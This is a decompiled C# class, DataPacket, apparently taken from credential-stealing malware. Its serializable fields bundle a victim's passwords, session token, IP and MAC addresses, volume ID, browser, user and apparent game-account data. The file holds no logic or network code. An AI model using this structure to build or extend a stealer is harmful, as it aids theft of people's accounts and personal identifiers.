using System;
using System.Runtime.Serialization;

namespace Trash
{
	// Token: 0x02000008 RID: 8
	[DataContract]
	internal class DataPacket
	{
		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600003D RID: 61 RVA: 0x00002297 File Offset: 0x00000497
		// (set) Token: 0x0600003E RID: 62 RVA: 0x0000229F File Offset: 0x0000049F
		[DataMember]
		public string resolution { get; set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600003F RID: 63 RVA: 0x000022A8 File Offset: 0x000004A8
		// (set) Token: 0x06000040 RID: 64 RVA: 0x000022B0 File Offset: 0x000004B0
		[DataMember]
		public string lastworld { get; set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000041 RID: 65 RVA: 0x000022B9 File Offset: 0x000004B9
		// (set) Token: 0x06000042 RID: 66 RVA: 0x000022C1 File Offset: 0x000004C1
		[DataMember]
		public string os { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000043 RID: 67 RVA: 0x000022CA File Offset: 0x000004CA
		// (set) Token: 0x06000044 RID: 68 RVA: 0x000022D2 File Offset: 0x000004D2
		[DataMember]
		public string gid { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000045 RID: 69 RVA: 0x000022DB File Offset: 0x000004DB
		// (set) Token: 0x06000046 RID: 70 RVA: 0x000022E3 File Offset: 0x000004E3
		[DataMember]
		public string ip { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000047 RID: 71 RVA: 0x000022EC File Offset: 0x000004EC
		// (set) Token: 0x06000048 RID: 72 RVA: 0x000022F4 File Offset: 0x000004F4
		[DataMember]
		public string date { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000049 RID: 73 RVA: 0x000022FD File Offset: 0x000004FD
		// (set) Token: 0x0600004A RID: 74 RVA: 0x00002305 File Offset: 0x00000505
		[DataMember]
		public string passwords { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x0600004B RID: 75 RVA: 0x0000230E File Offset: 0x0000050E
		// (set) Token: 0x0600004C RID: 76 RVA: 0x00002316 File Offset: 0x00000516
		[DataMember]
		public string volid { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x0600004D RID: 77 RVA: 0x0000231F File Offset: 0x0000051F
		// (set) Token: 0x0600004E RID: 78 RVA: 0x00002327 File Offset: 0x00000527
		[DataMember]
		public string MAC { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600004F RID: 79 RVA: 0x00002330 File Offset: 0x00000530
		// (set) Token: 0x06000050 RID: 80 RVA: 0x00002338 File Offset: 0x00000538
		[DataMember]
		public string computerInfo { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000051 RID: 81 RVA: 0x00002341 File Offset: 0x00000541
		// (set) Token: 0x06000052 RID: 82 RVA: 0x00002349 File Offset: 0x00000549
		[DataMember]
		public string browser { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000053 RID: 83 RVA: 0x00002352 File Offset: 0x00000552
		// (set) Token: 0x06000054 RID: 84 RVA: 0x0000235A File Offset: 0x0000055A
		[DataMember]
		public string user { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00002363 File Offset: 0x00000563
		// (set) Token: 0x06000056 RID: 86 RVA: 0x0000236B File Offset: 0x0000056B
		[DataMember]
		public string id { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000057 RID: 87 RVA: 0x00002374 File Offset: 0x00000574
		// (set) Token: 0x06000058 RID: 88 RVA: 0x0000237C File Offset: 0x0000057C
		[DataMember]
		public string token { get; set; }
	}
}
